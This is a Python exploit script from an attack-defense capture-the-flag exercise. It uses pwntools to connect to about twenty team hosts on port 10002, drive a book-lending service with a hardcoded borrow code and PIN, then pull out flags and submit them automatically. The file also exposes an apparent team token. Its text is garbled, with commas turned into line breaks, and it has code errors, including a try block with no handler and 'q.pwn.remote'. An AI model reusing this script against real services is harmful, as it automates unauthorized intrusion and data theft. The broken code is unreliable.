from swpag_client import Team
import requests
import json
import pwn

pwn.context.arch = 'amd64'


t = Team("http://actf2.cse545.io/"
 "391No5WGblfRy66WqwVZ")
'''
t.get_targets(2)
#t.submit_flag(["FLG07oHDPj3HVQlV"])

data=t.get_targets(2)
with open('data.json'
 'w') as outfile:
    json.dump(data
 outfile)
f = open('data.json'
)
data = json.load(f)
#print(data)


for i
j in zip(data[0]
data[1]):
    print(i)
    print(j)
'''
teamlist=[]
for i in range(1
22):
    if i==4:
        continue
    teamlist.append("team"+str(i))
print(teamlist)

for team
target in zip(teamlist
t.get_targets(2)) :
    p=pwn.remote(team
'10002')
    fl_id = target['flag_id']
    try:
        p.recvuntil('(1-5): ')
        #p.recvline() #"Your choice (1-3): "
        p.sendline('2')
    
        p.recvuntil('ID: ')
  
        p.sendline(fl_id)
        p.recvuntil('book!\n')
        cmd='\"borrow_code+\n+a5ccb1c538e34663a658b1be28b16455ee5285efb10e6f1d4caba1f69ec9782b\"'
        p.sendline(cmd)
        #p.interactive()
    
for team
target in zip(teamlist
t.get_targets(2)):
    q.pwn.remote(team
'10002')
    fl_id = target['flag_id']
    try:
        p.recvuntil('(1-5): ')
        #p.recvline() #"Your choice (1-3): "
        p.sendline('4')
        
        p.recvuntil('ID: ')
        p.sendline(fl_id)
        p.recvuntil('please: ')
        p.sendline('911')
        
        flag=[]
        p.recvuntil('FLG')
        fflag=p.recv(13)
        fflag="FLG" + fflag
        flag.append(fflag)
        print(fflag)
        t.submit_flag([fflag])
    except EOFError as error:
        continue
        
#print("flag is : " + flag)
#flag="FLG" + flag
#print("real flag is : " + flag)
